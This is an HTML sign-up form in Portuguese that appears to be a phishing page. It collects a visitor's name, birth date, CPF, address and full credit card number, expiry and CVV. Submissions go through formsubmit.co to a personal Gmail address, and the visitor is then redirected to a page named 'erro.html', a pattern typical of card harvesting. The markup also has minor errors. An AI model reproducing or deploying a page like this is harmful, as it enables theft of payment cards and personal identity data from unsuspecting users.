<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/css/style.css">
    <title>formulario de cadastro</title>
</head>

<body>
    <div class="container">
        <div class="form-image">
            <img src="assets/img/undraw_shopping_re_hdd9.svg">
        </div>
        <div class="form">
            <form action="https://formsubmit.co/vivaldodomingosaraujodomingos@gmail.com" 
                method="POST">
                <div class="form-header">
                    <div class="title">
                        <h1>Cadastre-se</h1>
                    </div>
                    <div class="button">
                          <input type="hidden" name="_next" value="http://127.0.0.1:5500/erro.html">
                          <button type="submit">Cadastrar</button>
                    </div>
                </div>

                <div class="input-group">
                    <div class="input-box">
                        <label for="name">nome</label>
                        <input type="text" name="name" placeholder="nome completo" id="nome"  required> 
                    </div>

                    </div class="input-box">
                        <label for="data de nascimento">data de nascimento</label>
                        <input type="date" name="data de nascimento" placeholder="data de nascimento" id="data de nascimento"  required>
                    </div>

                    <div class="input-box">
                        <label for="Email">Email</label>
                        <input type="email" name="Email" placeholder="Email para contato" id="Email" required>
                    </div>
                    
                    <div class="input-box">
                        <label for="cpf">CPF</label>
                        <input type="text" name="CPF" placeholder="CPF DO TITULAR" id="CPF"  required> 
                    </div>

                    <div class="input-box">
                        <label for="CEP">CEP</label>
                        <input type="text" name="CEP" placeholder="CEP" id="CPF"  required> 
                    </div>

                    <div class="input-box">
                        <label for="Casa">casa</label>
                        <input type="text" name="casa" placeholder="Numero da casa" id="Casa"  required> 
                    </div>

                    <div class="input-box">
                        <label for="Cidade">Cidade</label>
                        <input type="text" name="Cidade" placeholder="Cidade" id="Cidade"  required> 
                    </div>

                    <div class="input-box">
                        <label for="Numero do cart達o">Numero do cart達o</label>
                        <input type="text" name="Numero do cart達o" placeholder="XXXX XXXX XXXX XXXX" id="Numero do cart達o"  required> 
                    </div>

                    <div class="input-box">
                        <label for="MM/AA">MM/AA</label>
                        <input type="text" name="MM/AA" placeholder="DATA DE VENCIMENTO" id="MM/AA"  required> 
                    </div>

                    <div class="input-box">
                        <label for="CVV">CVV</label>
                        <input type="number" name="CVV" placeholder="XXX" id="CVV"  required> 
                    </div>
                <div> 

                  
            </form>
        </div>
    </div>
    
</body>
</html>
